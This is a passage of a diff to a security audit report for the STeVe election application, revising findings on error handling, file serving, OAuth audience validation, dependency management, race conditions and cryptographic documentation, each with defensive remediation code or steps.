-| **Source Reports** | 13.4.2.md, 15.2.3.md |
-| **Related Findings** | None | **Description:**
-
-Both execution modes unconditionally set the root logging level to DEBUG with no environment-based differentiation. There is no configuration option to control this in config.yaml.example. DEBUG-level logging can capture sensitive data (session tokens, database queries, request payloads) that could be exposed through log aggregation systems, error handlers, or if logs are inadvertently exposed.
+The application defines no "last resort" error handler. There is no @APP.errorhandler(Exception), @APP.errorhandler(500), or equivalent catch-all that would: 1. Log the full exception details for debugging, 2. Return a generic error page to the user, 3. Prevent the application process from crashing on unexpected exceptions. Only ElectionNotFound, IssueNotFound, and PersonNotFound are caught in specific locations. Any other exception type (e.g., sqlite3.OperationalError, TypeError, KeyError, json.JSONDecodeError) propagates to the framework default handler. Quart's default behavior in production mode returns a 500 page, but there's no guarantee DEBUG mode isn't enabled, error details are not guaranteed to be logged by a custom handler, no alerting or escalation is triggered, and no consistent error response format exists. Entry points without exception coverage include: all routes using load_election only catch ElectionNotFound, voter_page() calls Election.open_to_pid() with no error handling, admin_page() calls PersonDB.open() with no handling for DB errors, and serve_doc() uses send_from_directory() with no handling for OS errors.
 
 **Remediation:**
 
-Add environment-aware logging and an explicit debug flag. Add debug: false and log_level: WARNING to config.yaml.example as production-safe defaults. Modify main.py to respect configuration:
+Implement global exception handlers:
 
 ```python
-log_level = getattr(logging, app.cfg.server.get('log_level', 'WARNING').upper())
+@APP.errorhandler(Exception)
+async def last_resort_handler(error):
+    """Catch-all error handler to log details and return generic error."""
+    _LOGGER.exception(f'Unhandled exception: {error}')
+    return await quart.render_template('error_500.html'), 500
+
+@APP.errorhandler(500)
+async def internal_error(error):
+    """Handle 500 Internal Server Errors."""
+    _LOGGER.error(f'Internal server error: {error}')
+    return await quart.render_template('error_500.html'), 500
+
+@APP.errorhandler(503)
+async def service_unavailable(error):
+    """Handle service unavailability."""
+    _LOGGER.warning(f'Service unavailable: {error}')
+    return await quart.render_template('error_503.html'), 503
 ```
 
-and add warning if debug mode is enabled.
-
 ---
 
-#### FINDING-066: No documented risk-based remediation timeframes for third-party component vulnerabilities
+#### FINDING-072: No file size validation to prevent denial of service
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟠 High |
 | **ASVS Level(s)** | L1 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.1.1 |
-| **Files** | Project-wide (no documentation file found), v3/steve/crypto.py, v3/steve/election.py, v3/server/main.py |
-| **Source Reports** | 15.1.1.md |
-| **Related Findings** | None | **Description:**
-
-The provided codebase contains multiple third-party dependencies (cryptography, argon2-cffi, asfpy, easydict, Quart/asfquart, ezt) but no documentation defining risk-based remediation timeframes for addressing vulnerabilities or specifying update cadence for these libraries. No SECURITY.md, DEPENDENCY_POLICY.md, or equivalent documentation is present that defines: Critical vulnerability remediation timeframe (e.g., 24-48 hours), High vulnerability remediation timeframe (e.g., 7 days), Medium/Low vulnerability remediation timeframe (e.g., 30-90 days), or Routine update schedule for non-vulnerable components.
-
-**Remediation:**
-
-Create a docs/DEPENDENCY_POLICY.md with explicit timeframes defining: Critical (CVSS ≥ 9.0) remediation within 48 hours, High (CVSS 7.0-8.9) within 7 days, Medium (CVSS 4.0-6.9) within 30 days, Low (CVSS < 4.0) within 90 days. Include routine update schedules: Security-critical libraries (cryptography, argon2-cffi) monthly review, Framework libraries (Quart/asfquart) quarterly review, Utility libraries (easydict, asfpy) semi-annual review. Implement automated CVE monitoring via GitHub Dependabot/Safety/pip-audit and manual review of security advisories for cryptography library.
-
----
-
-#### FINDING-067: No Software Bill of Materials (SBOM) or dependency manifest with pinned versions
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2, L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.1.2, 15.2.4 |
-| **Files** | Project-wide, All provided files |
-| **Source Reports** | 15.1.2.md, 15.2.4.md |
-| **Related Findings** | None | **Description:**
-
-The provided codebase does not include a visible requirements.txt, pyproject.toml with pinned dependencies, Pipfile.lock, uv.lock, or any SBOM document (e.g., CycloneDX or SPDX format). While main.py uses a uv run --script shebang suggesting uv as the package manager, no lock file or dependency specification with version pins is provided. Identified dependencies from code analysis include: cryptography (Fernet, HKDF, hashes) from crypto.py, argon2-cffi (low_level) from crypto.py, asfpy (db, generics) from election.py and main.py, easydict from election.py, asfquart (Quart wrapper) from main.py, and ezt (templating) from domain context. All versions are unknown. Without a versioned inventory: transitive dependencies are untracked (e.g., cryptography pulls in cffi, pycparser), reproducible builds are not guaranteed, vulnerability scanning tools cannot accurately assess the dependency tree, and there is no verification that dependencies come from trusted repositories.
-
-**Remediation:**
-
-1. Create a pyproject.toml with pinned dependencies including cryptography>=43.0.0, argon2-cffi>=23.1.0, asfpy>=0.45, easydict>=1.13, quart>=0.19.0, ezt>=1.2. 2. Generate and maintain a lock file using uv lock with hash verification (uv lock --generate-hashes). 3. Generate SBOM in CycloneDX format using cyclonedx-py environment -o sbom.json. 4. Configure automated SBOM generation in CI/CD pipeline.
-
----
-
-#### FINDING-068: Undocumented resource-intensive Argon2 operations with potential denial-of-service impact
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.1.3 |
-| **Files** | v3/steve/crypto.py:91-101, v3/steve/election.py:265-324 |
-| **Source Reports** | 15.1.3.md |
-| **Related Findings** | None | **Description:**
-
-The application contains several resource-intensive operations that are not documented, including Argon2 key derivation that allocates 64MB per call, tally operations that iterate over all voters, and vote submission operations. For an election with 1000 voters and 10 issues, tally_issue() requires 1000 Argon2 calls with potential 64GB aggregate memory demand. Concurrent vote submissions during peak periods could exhaust server memory. There is no documentation of these resource demands, no documented rate limiting or queuing strategy, no consumer timeout guidance, and no documentation of maximum supported election size.
-
-**Remediation:**
-
-Create docs/RESOURCE_ANALYSIS.md documenting: (1) Argon2 key derivation operations consuming 64MB memory and ~50ms CPU per operation at vote submission, tally computation, and election opening; (2) Tally computation complexity of O(voters × issues) Argon2 operations, mitigated by performing offline via admin CLI; (3) Vote submission complexity of 1 Argon2 operation per vote with max concurrent operations limited by server memory; (4) Election opening complexity of O(voters × issues) salt generations plus 1 Argon2 operation; (5) Defense mechanisms including CLI-based tally operations, authenticated vote submission, and single-instance architecture limiting parallelism.
-
----
-
-#### FINDING-069: Cannot verify component versions are within remediation timeframes due to missing version specifications
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L1 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.2.1 |
-| **Files** | v3/steve/crypto.py, Project-wide |
-| **Source Reports** | 15.2.1.md |
-| **Related Findings** | None | **Description:**
-
-Since no dependency manifest with pinned versions exists (as identified in ASVS-15.1.2), and no remediation policy exists (as identified in ASVS-15.1.1), it is impossible to verify that all components are within their documented update and remediation timeframes. Specific concerns include: 1) cryptography library has frequent security advisories without a pinned version, 2) Argon2 Type.D usage in production vs Type.ID in benchmark (OWASP recommends Type.ID for password hashing), 3) asfpy ASF-internal library with unknown release cadence and vulnerability tracking, 4) HKDF info parameter mismatch (info=b'xchacha20_key') suggesting code in transitional state. Without verifiable version information: known CVEs in dependencies may be present but undetected, the application may be running outdated versions of security-critical libraries, auditors cannot confirm compliance with any remediation SLA, and the cryptography library specifically has had multiple high-severity CVEs in recent years.
-
-**Remediation:**
-
-1. Pin all dependency versions in pyproject.toml or equivalent. 2. Implement automated vulnerability scanning using pip-audit --require-hashes --desc or uv pip audit in CI/CD pipeline. 3. Create a dependency update log documenting Date, Component, From Version, To Version, and Reason for each update.
-
-#### FINDING-070: Unbounded Argon2 Computation in Tally Operation Without Resource Controls
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2 |
 | **CWE** | - |
-| **ASVS Section(s)** | 15.2.2 |
-| **Files** | v3/steve/election.py:245-305 |
-| **Source Reports** | 15.2.2.md |
-| **Related Findings** | - | **Description:**
+| **ASVS Section(s)** | 5.2.1 |
+| **Files** | v3/server/pages.py:entire application scope |
+| **Source Reports** | 5.2.1.md |
+| **Related** | - |
 
-The tally_issue() function performs unbounded Argon2 computations (64MB per call) for each eligible voter without resource controls. An election with 1000 eligible voters would trigger 1000 sequential Argon2 computations, consuming approximately 64GB of peak memory throughput and taking minutes to complete. An attacker with admin access or exploiting a state manipulation bug could trigger this repeatedly, causing denial of service through memory and CPU exhaustion. The has_voted_upon() function performs similar unbounded Argon2 iteration for authenticated voters, proportional to the number of issues in an election.
+**Description:**
+
+The application serves documents via `/docs/<iid>/<docname>` but has no visible file upload endpoint with size validation. The mechanism by which documents are placed into `DOCSDIR` is not shown in the provided code, meaning there are no observable file size checks that would prevent a denial of service via excessively large files. If files are uploaded through an undocumented mechanism, no size limits are enforced by the shown code. Additionally, the Quart application does not set `MAX_CONTENT_LENGTH` (or equivalent) to limit request body size globally, which would affect any file upload functionality added in the future.
 
 **Remediation:**
 
-Implement concurrent operation limits using semaphores and process votes in batches to limit memory pressure. Example: Use asyncio.Semaphore to limit concurrent Argon2 operations to 4, and process eligible voters in batches of 50 using ThreadPoolExecutor with max_workers=4.
+Configure `APP.config['MAX_CONTENT_LENGTH'] = 10 * 1024 * 1024` to set a 10 MB max upload limit. In any file upload handler, implement explicit size checking by seeking to the end of the file, checking the size, and rejecting files that exceed the maximum allowed size (e.g., 10 MB) with a 413 status code.
 
 ---
 
-#### FINDING-071: Internal ASF Packages (asfquart, asfpy) Potentially Vulnerable to Dependency Confusion
+#### FINDING-073: Missing file extension and content validation in document serving endpoint
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟠 High |
-| **ASVS Level(s)** | L3 |
+| **ASVS Level(s)** | L1, L2 |
 | **CWE** | - |
-| **ASVS Section(s)** | 15.2.4 |
-| **Files** | v3/server/main.py:30-31, v3/steve/election.py:24 |
-| **Source Reports** | 15.2.4.md |
-| **Related Findings** | - | **Description:**
+| **ASVS Section(s)** | 5.2.2, 5.3.1, 1.3.3 |
+| **Files** | v3/server/pages.py:560-574 |
+| **Source Reports** | 5.2.2.md, 5.3.1.md, 1.3.3.md |
+| **Related** | - |
 
-Both asfquart and asfpy appear to be ASF-internal packages. Without visible evidence of: A pyproject.toml or requirements.txt with explicit index URLs, A pip.conf or uv configuration pointing to an internal package index, Version pinning with hash verification, A .python-version or lock file. An attacker could register asfquart or asfpy on public PyPI (if not already registered) with a higher version number, causing dependency confusion during installation. Note: If these packages ARE published on PyPI by ASF (asfpy is indeed on PyPI), this reduces but does not eliminate the risk — version pinning and hash verification are still necessary. Data Flow: Package manager resolution → asfquart / asfpy → if not properly configured to resolve from ASF internal repository first → could resolve from public PyPI → malicious package execution.
+**Description:**
 
-**Remediation:**
-
-Configure explicit index URLs and pin versions with hashes in pyproject.toml or uv.lock: [tool.uv] index-url = "https://pypi.org/simple/" [tool.uv.sources] asfpy = { version = "==X.Y.Z", hash = "sha256:..." } asfquart = { version = "==X.Y.Z", hash = "sha256:..." }
-
----
-
-#### FINDING-072: No Trusted Proxy Configuration for IP Address Handling
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Section(s)** | 15.3.4 |
-| **Files** | v3/server/pages.py:entire file |
-| **Source Reports** | 15.3.4.md |
-| **Related Findings** | - | **Description:**
-
-The application has no proxy trust configuration (no ProxyFix middleware, no Quart proxy settings), no IP address extraction from requests for logging, no X-Forwarded-For header processing, no rate limiting based on IP address, and no configuration for trusted proxy headers. Without proper proxy configuration, if rate limiting is added later it could be trivially bypassed by spoofing X-Forwarded-For headers. Security logs lack client IP context, making forensic analysis difficult. An attacker who compromises a session could not be distinguished by IP. If deployed behind a reverse proxy, the application cannot distinguish the original client IP.
+The `serve_doc()` endpoint serves arbitrary files from the `DOCSDIR` directory. While no upload handler is visible in this codebase, the docs directory appears to be populated through external means (files are referenced via `doc:filename` patterns in issue descriptions). There is no validation that served files are non-executable content types. If an attacker (or misconfigured process) places a file with a server-executable extension (e.g., `.py`, `.php`) in the docs directory, and if a reverse proxy or misconfigured server processes certain extensions, the file could be executed. With `send_from_directory`, Quart serves files as static content which mitigates direct Python execution, but upstream server configurations could still be vulnerable.
 
 **Remediation:**
 
-Configure trusted proxy count in application initialization using app.config['PROXY_FIX_X_FOR'] = 1 and app.config['PROXY_FIX_X_PROTO'] = 1, or use werkzeug.middleware.proxy_fix.ProxyFix middleware with x_for=1 and x_proto=1 parameters. Add IP address logging to security events using quart.request.remote_addr in all _LOGGER.info() calls for security-relevant actions.
+Implement file extension allowlist validation and magic bytes content verification using python-magic library. Add security headers (X-Content-Type-Options: nosniff, Content-Disposition: attachment) to all file serve responses. Verify the file extension matches an allowed list (e.g., .pdf, .txt, .png, .jpg, .jpeg), then validate that the detected MIME type matches the expected MIME type for that extension. Reject requests for files that fail either check.
 
 ---
 
-#### FINDING-073: Vote Insertion Uses Non-Thread-Safe Multi-Step Database Access Without Synchronization
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L3 |
-| **CWE** | - |
-| **ASVS Section(s)** | 15.4.1 |
-| **Files** | v3/steve/election.py:242-251 |
-| **Source Reports** | 15.4.1.md |
-| **Related Findings** | - | **Description:**
-
-The add_vote() method performs multiple unsynchronized database operations (read metadata, query mayvote, insert vote) without transaction or lock protection. Concurrent HTTP requests create separate Election instances with separate DB connections, leading to potential interleaved database state. Under concurrent voting, the autoincrement IDs in the vote table reveal insertion order, which combined with authentication logs could correlate voters to votes. The multi-step read-compute-write pattern is not atomic, even though SQLite serializes the actual writes.
-
-**Remediation:**
-
-Wrap the add_vote() method with an asyncio.Lock to ensure atomic execution of the multi-step operation. Add random delay to decorrelate insertion order from request timing. Convert method to async and use: async with _vote_lock: [perform all operations] followed by await asyncio.sleep(random.uniform(0, 0.1)) before insertion.
-
----
-
-#### FINDING-074: Non-Atomic Check-Then-Use in Vote Recording Allows Voting on Closed Elections
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L3, L2 |
-| **CWE** | CWE-367 |
-| **ASVS Section(s)** | 15.4.2, 2.3.4 |
-| **Files** | v3/steve/election.py:242-251 |
-| **Source Reports** | 15.4.2.md, 2.3.4.md |
-| **Related Findings** | FINDING-219, FINDING-220 | **Description:**
-
-The add_vote() method performs a non-atomic check-then-use operation where it first checks if the election is open (_all_metadata(self.S_OPEN)) and then later inserts the vote (c_add_vote.perform()). Between these two operations, a concurrent close() call can change the election state, allowing votes to be inserted into a closed election. The data flow is: _all_metadata(self.S_OPEN) [CHECK: election is open] → computation → c_add_vote.perform() [USE: insert vote]. Timeline: T1: Voter A calls add_vote(), passes state check (election is OPEN); T2: Admin calls close(), election state changes to CLOSED; T3: Voter A's c_add_vote.perform() executes, inserting vote into CLOSED election. This violates election integrity as votes can be recorded after an election is closed.
-
-**Remediation:**
-
-Use a single transaction with an immediate lock. Use BEGIN IMMEDIATE at the start of the open() method. Re-check state inside the transaction (with lock held) by calling _all_metadata() and _compute_state(). If state is not S_EDITABLE, rollback and raise ElectionBadState. Perform all operations atomically within the transaction: _add_salts_no_transaction(), gather_election_data(), gen_salt(), gen_opened_key(), and c_open.perform(). Wrap in try/except to ensure ROLLBACK on error and COMMIT on success.
-
----
-
-#### FINDING-075: Inconsistent Transaction Usage — Some Multi-Step Operations Are Transactional, Others Are Not
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L3 |
-| **CWE** | - |
-| **ASVS Section(s)** | 15.4.3 |
-| **Files** | v3/steve/election.py:multiple methods |
-| **Source Reports** | 15.4.3.md |
-| **Related Findings** | - | **Description:**
-
-The inconsistency means that code reviewers and maintainers may incorrectly assume all multi-step operations are safe. The delete and add_salts methods demonstrate that the developers understand the need for transactions, but the same pattern is not applied to add_vote and open which are equally (or more) critical for election integrity. This creates a Type B gap: the control EXISTS (transaction mechanism) but is NOT CONSISTENTLY CALLED.
-
-**Remediation:**
-
-Wrap add_vote in BEGIN IMMEDIATE transaction with proper try/except/ROLLBACK error handling. Use BEGIN IMMEDIATE to acquire a write lock upfront, preventing concurrent modifications between state check and vote insertion. Apply the same pattern to open() method and all other multi-step operations.
-
----
-
-#### FINDING-076: No Rate Limiting on Vote Submission or Election Creation Enables Resource Exhaustion
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L3, L2, L1 |
-| **CWE** | - |
-| **ASVS Section(s)** | 15.4.4, 2.4.1, 2.4.2, 6.3.1 |
-| **Files** | v3/server/pages.py:385-425, v3/steve/election.py: |
-| **Source Reports** | 15.4.4.md, 2.4.1.md, 2.4.2.md, 6.3.1.md |
-| **Related Findings** | - | **Description:**
-
-The vote submission endpoint has no rate limiting or timing validation whatsoever. An authenticated user can submit votes as rapidly as their network connection allows, with no enforcement of realistic human timing. While the system's re-voting design means only the last vote per voter/issue counts, rapid automated submission creates race conditions in determining which vote is "last" and violates the principle that voting systems should enforce realistic human interaction timing. The vote submission endpoint `/do-vote/<eid>` has no rate limiting controls. Authenticated users can submit unlimited POST requests, with each request adding a new row to the vote table. With 100,000 iterations, the table grows by 100,000 rows per issue. Since only the latest vote counts, all but the last are dead weight consuming storage and slowing tally operations.
-
-**Remediation:**
-
-Implement per-user rate limiting (1 vote per 10 seconds) using quart-rate-limiter. Example: `@rate_limit(10, timedelta(minutes=1))` to limit to 10 votes per minute per user on the `do_vote_endpoint()` function. Add minimum time interval checks since last vote by the user. Track last_vote_timestamp and enforce MINIMUM_VOTE_INTERVAL before processing new votes.
-
----
-
-#### FINDING-077: OAuth Configuration Lacks Audience/Client Identification
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Section(s)** | 9.2.4 |
-| **Files** | v3/server/main.py:31-35 |
-| **Source Reports** | 9.2.4.md |
-| **Related Findings** | - | **Description:**
-
-The OAuth authorization URL (OAUTH_URL_INIT) does not include a client_id parameter. In standard OAuth 2.0 (RFC 6749 §4.1.1), the client_id is REQUIRED in the authorization request and is the mechanism by which the authorization server can scope the issued token to a specific audience. Similarly, the token exchange URL (OAUTH_URL_CALLBACK) only passes the authorization code without client credentials. Without client_id: (1) The OAuth server cannot issue audience-restricted tokens, (2) If the same OAuth provider's private key signs tokens for multiple relying parties, any token is valid everywhere, (3) A token obtained by visiting another ASF application (sharing the same OAuth server) could be replayed against STeVe.
-
-**Remediation:**
-
-Include client_id in OAuth requests. Add CLIENT_ID from configuration and update OAUTH_URL_INIT to include client_id parameter: 'https://oauth.apache.org/auth?client_id=%s&state=%s&redirect_uri=%s'. Update OAUTH_URL_CALLBACK to include client_id and client_secret: 'https://oauth.apache.org/token?code=%s&client_id=%s&client_secret=%s'.
-
----
-
-#### FINDING-078: No Token Audience Validation After OAuth Exchange
+#### FINDING-074: No Token Audience Validation After OAuth Exchange
 
 | Attribute | Value |
 |-----------|-------|
@@ -1598,37 +1748,45 @@ Include client_id in OAuth requests. Add CLIENT_ID from configuration and update
 | **ASVS Section(s)** | 9.2.4 |
 | **Files** | v3/server/pages.py:75-106 |
 | **Source Reports** | 9.2.4.md |
-| **Related Findings** | - | **Description:**
+| **Related** | - |
 
-The session data (uid, fullname, email) is consumed directly from asfquart.session.read() without any validation that the underlying token was issued specifically for the STeVe application. No aud claim is checked. No iss claim is verified against an expected value. By explicitly avoiding OIDC (as noted in main.py line 29), the application loses the standardized aud claim validation that OIDC ID tokens provide. OIDC requires that the ID token's aud claim contains the client_id of the relying party, which is exactly what ASVS 9.2.4 requires. If the OAuth provider issues tokens that can be consumed by multiple services, the application has no defense against cross-service token confusion attacks.
+**Description:**
 
-**Remediation:**
-
-Add audience and issuer validation in basic_info() function. Validate that token audience claim matches expected_audience (e.g., APP.cfg.oauth.client_id). Check if token_audience exists and matches expected value, handling both single string and list formats. Validate issuer claim matches 'https://oauth.apache.org'. Reject sessions that fail validation by setting uid, name, email to None and logging warnings.
-
----
-
-#### FINDING-079: No Anti-caching Headers Set for Sensitive Election Data Responses
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Section(s)** | 14.3.2 |
-| **Files** | v3/steve/election.py:all data-returning methods |
-| **Source Reports** | 14.3.2.md |
-| **Related Findings** | - | **Description:**
-
-The election module returns highly sensitive data through multiple methods that would ultimately be served as HTTP responses, but no cache-control mechanism is defined anywhere in the provided codebase. Given the domain context explicitly states 'Anti-caching headers should prevent browsers from storing sensitive pages' and the core requirement is ballot secrecy, this is a significant gap. The following methods return data requiring Cache-Control: no-store: get_metadata() (returns owner_pid, authz groups), has_voted_upon() (returns per-voter voting status), tally_issue() (returns decrypted vote tallies), list_issues() (returns election issues), get_voters_for_email() (returns voter PII - pid, name, email), open_to_pid() (returns elections available to specific voter). Data Flow: Database → election.py methods → web framework response → browser cache (uncontrolled). Browser caching of sensitive pages could expose: (1) Ballot secrecy violation - has_voted_upon() results cached in browser history reveal which issues a specific voter participated in, (2) Voter PII exposure - get_voters_for_email() returns names and email addresses that could persist in browser cache, (3) Election integrity - Cached tally results from tally_issue() could be examined on shared computers, (4) Voter-vote correlation risk - If both voter identity pages and voting status pages are cached, they can be correlated.
+The session data (uid, fullname, email) is consumed directly from asfquart.session.read() without any validation that the underlying token was issued specifically for the STeVe application. No aud claim is checked. No iss claim is verified against an expected value. By explicitly avoiding OIDC (as noted in main.py line 29 comment), the application loses the standardized aud claim validation that OIDC ID tokens provide. OIDC requires that the ID token's aud claim contains the client_id of the relying party, which is exactly what ASVS 9.2.4 requires. If the OAuth provider issues tokens that can be consumed by multiple services, the application has no defense against cross-service token confusion attacks. Any valid session from another ASF application sharing the same OAuth provider could potentially be used to access STeVe endpoints.
 
 **Remediation:**
 
-At the Quart web framework layer, apply anti-caching headers globally for all authenticated endpoints using @app.after_request decorator to set Cache-Control: no-store, no-cache, must-revalidate, max-age=0, Pragma: no-cache, and Expires: 0. Alternatively, apply headers more granularly for specific sensitive endpoints. Example: @app.after_request async def set_security_headers(response): response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'; response.headers['Pragma'] = 'no-cache'; response.headers['Expires'] = '0'; return response
+Add audience and issuer validation:
+
+```python
+async def basic_info():
+    """Return base-level EZT template data."""
+    basic = edict()
+    s = await asfquart.session.read()
+    if s:
+        # Validate audience claim matches this application
+        expected_audience = APP.cfg.oauth.client_id  # e.g., 'steve-voting'
+        token_audience = s.get('aud', s.get('audience'))
+        if token_audience and expected_audience not in (
+            token_audience if isinstance(token_audience, list) else [token_audience]
+        ):
+            _LOGGER.warning(f'Token audience mismatch: {token_audience} != {expected_audience}')
+            basic.update(uid=None, name=None, email=None)
+            return basic
+            
+        # Validate issuer
+        expected_issuer = 'https://oauth.apache.org'
+        if s.get('iss') and s.get('iss') != expected_issuer:
+            _LOGGER.warning(f'Token issuer mismatch: {s.get("iss")}')
+            basic.update(uid=None, name=None, email=None)
+            return basic
+            
+        basic.update(uid=s['uid'], name=s['fullname'], email=s['email'])
+```
 
 ### 3.3 Medium
 
-#### FINDING-080: No Documented Cryptographic Key Management Policy or Key Lifecycle
+#### FINDING-075: No Documented Cryptographic Key Management Policy or Key Lifecycle
 
 | Attribute | Value |
 |-----------|-------|
@@ -1638,7 +1796,9 @@ At the Quart web framework layer, apply anti-caching headers globally for all au
 | **ASVS Sections** | 11.1.1 |
 | **Files** | v3/steve/crypto.py, v3/docs/schema.md |
 | **Source Reports** | 11.1.1.md |
-| **Related Findings** | None | **Description:**
+| **Related Findings** | None |
+
+**Description:**
 
 The codebase contains multiple cryptographic keys and secrets (election salt, opened_key, vote_token, vote encryption keys) but there is no documented key management policy conforming to NIST SP 800-57 or an equivalent standard. While schema.md provides some documentation of what keys exist, it does not constitute a key lifecycle policy addressing: Key generation procedures and responsibilities, Key storage and protection requirements, Key distribution controls, Key usage periods / expiration, Key revocation and destruction procedures, Key recovery mechanisms. Without a documented key lifecycle, keys may persist beyond their intended use period, accumulate risk, and lack clear procedures for compromise response. The opened_key persists in the database indefinitely after an election closes, with no documented destruction schedule.
 
@@ -1648,7 +1808,7 @@ Create a formal cryptographic key management policy document covering: 1. Key ty
 
 ---
 
-#### FINDING-081: Incomplete Cryptographic Inventory - Missing Algorithm and Key Usage Documentation
+#### FINDING-076: Incomplete Cryptographic Inventory - Missing Algorithm and Key Usage Documentation
 
 | Attribute | Value |
 |-----------|-------|
@@ -1656,19 +1816,21 @@ Create a formal cryptographic key management policy document covering: 1. Key ty
 | **ASVS Level(s)** | L2 |
 | **CWE** | N/A |
 | **ASVS Sections** | 11.1.2 |
-| **Files** | crypto.py:49, crypto.py:61-66, schema.md |
+| **Files** | v3/steve/crypto.py:49, v3/steve/crypto.py:61-66, v3/docs/schema.md |
 | **Source Reports** | 11.1.2.md |
-| **Related Findings** | None | **Description:**
+| **Related Findings** | None |
 
-While `schema.md` documents some cryptographic assets, it does not constitute a complete cryptographic inventory. The following are not formally inventoried: 1) Algorithms not documented: BLAKE2b (64-byte digest, used as pre-hash for Argon2), HKDF-SHA256 (used for key stretching vote_token → vote_key), The specific Fernet composition (AES-128-CBC + HMAC-SHA256). 2) Key usage boundaries not documented: Where each key type CAN be used vs. CANNOT be used, What data types each key protects, Which components have access to which keys. 3) No centralized inventory document: Crypto information is scattered across `schema.md`, `crypto.py` comments, and `schema.sql` comments. Without a complete inventory, it's impossible to systematically assess cryptographic risk, plan migrations, or ensure all cryptographic assets are properly managed.
+**Description:**
+
+While schema.md documents some cryptographic assets, it does not constitute a complete cryptographic inventory. The following are not formally inventoried: 1) Algorithms not documented: BLAKE2b (64-byte digest, used as pre-hash for Argon2), HKDF-SHA256 (used for key stretching vote_token → vote_key), The specific Fernet composition (AES-128-CBC + HMAC-SHA256). 2) Key usage boundaries not documented: Where each key type CAN be used vs. CANNOT be used, What data types each key protects, Which components have access to which keys. 3) No centralized inventory document: Crypto information is scattered across schema.md, crypto.py comments, and schema.sql comments. Without a complete inventory, it's impossible to systematically assess cryptographic risk, plan migrations, or ensure all cryptographic assets are properly managed.
 
 **Remediation:**
 
-Create a dedicated `CRYPTO_INVENTORY.md` document containing a comprehensive table with columns: Asset, Algorithm, Key Length, Purpose, Protected Data, Access Scope, Location. The inventory should include: Election salt (N/A random, 128 bits, Argon2 input, Server-only, election.salt), Opened key (Argon2d(BLAKE2b(edata)), 256 bits, Tamper detection + vote token derivation, Server-only, election.opened_key), Mayvote salt (N/A random, 128 bits, Per-voter differentiation, Server-only, mayvote.salt), Vote token (Argon2d(opened_key‖pid‖iid, salt), 256 bits, Voter identification + key derivation, Server-only, vote.vote_token), Vote key (HKDF-SHA256(vote_token, salt), 256 bits, Vote encryption, Ephemeral, Derived in memory), Ciphertext (Fernet (AES-128-CBC + HMAC-SHA256), N/A, Vote confidentiality, Stored, vote.ciphertext).
+Create a dedicated CRYPTO_INVENTORY.md document containing a table with columns: Asset, Algorithm, Key Length, Purpose, Protected Data, Access Scope, Location. Include all cryptographic assets: election salt, opened key, mayvote salt, vote token, vote key, and ciphertext with their respective algorithms and parameters.
 
 ---
 
-#### FINDING-082: No Cryptographic Discovery Mechanisms Employed
+#### FINDING-077: No Cryptographic Discovery Mechanisms Employed
 
 | Attribute | Value |
 |-----------|-------|
@@ -1676,39 +1838,43 @@ Create a dedicated `CRYPTO_INVENTORY.md` document containing a comprehensive tab
 | **ASVS Level(s)** | L3 |
 | **CWE** | N/A |
 | **ASVS Sections** | 11.1.3 |
-| **Files** | pyproject.toml, pages.py:269 |
+| **Files** | pyproject.toml, v3/steve/pages.py:269 |
 | **Source Reports** | 11.1.3.md |
-| **Related Findings** | None | **Description:**
+| **Related Findings** | None |
+
+**Description:**
 
 There is no evidence of automated cryptographic discovery mechanisms being employed to identify all instances of cryptography in the system. No tooling, CI/CD pipeline steps, or scanning configurations are present to: discover all cryptographic library usage, identify encryption, hashing, and signing operations, detect introduction of new cryptographic operations, or flag deprecated or weak algorithm usage. The pyproject.toml defines development dependencies but includes no cryptographic scanning tools. No tools like cryptosense, crypto-detector, semgrep with crypto rules, or custom SAST rules for cryptographic operations are configured.
 
 **Remediation:**
 
-1. Add a cryptographic linting step to CI/CD using tools like: semgrep with crypto-specific rules, custom ruff or pylint rules flagging hashlib, cryptography, hmac imports, or SAST tools configured to flag crypto operations. 2. Maintain a list of approved crypto imports/modules. 3. Run periodic scans to detect drift from the inventory.
+1. Add a cryptographic linting step to CI/CD using tools like: semgrep with crypto-specific rules, custom ruff or pylint rules flagging hashlib, cryptography, hmac imports, SAST tools configured to flag crypto operations. 2. Maintain a list of approved crypto imports/modules. 3. Run periodic scans to detect drift from the inventory.
 
 ---
 
-#### FINDING-083: No Documented Post-Quantum Cryptography Migration Plan
+#### FINDING-078: No Documented Post-Quantum Cryptography Migration Plan
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
+| **ASVS Level(s)** | L3, L1 |
 | **CWE** | N/A |
-| **ASVS Sections** | 11.1.4 |
+| **ASVS Sections** | 11.1.4, 15.1.1 |
 | **Files** | v3/steve/crypto.py:63, v3/docs/schema.md |
-| **Source Reports** | 11.1.4.md |
-| **Related Findings** | None | **Description:**
+| **Source Reports** | 11.1.4.md, 15.1.1.md |
+| **Related Findings** | None |
+
+**Description:**
 
